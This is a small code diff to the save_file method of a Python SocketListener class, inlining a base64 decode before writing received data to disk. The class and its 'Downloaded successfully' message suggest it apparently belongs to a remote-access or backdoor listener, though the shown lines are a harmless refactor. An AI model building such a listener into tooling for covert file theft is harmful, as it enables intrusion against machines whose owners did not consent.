@@ -39,11 +39,9 @@ class SocketListener:
 
     # Saving file
     def save_file(self,path,content):
-        # content is base64 string, decode it back to bytes
         try:
-            file_bytes = base64.b64decode(content)
             with open(path, "wb") as my_file:
-                my_file.write(file_bytes)
+                my_file.write(base64.b64decode(content))
                 return "Downloaded successfully"
         except Exception:
             return "Error saving file"
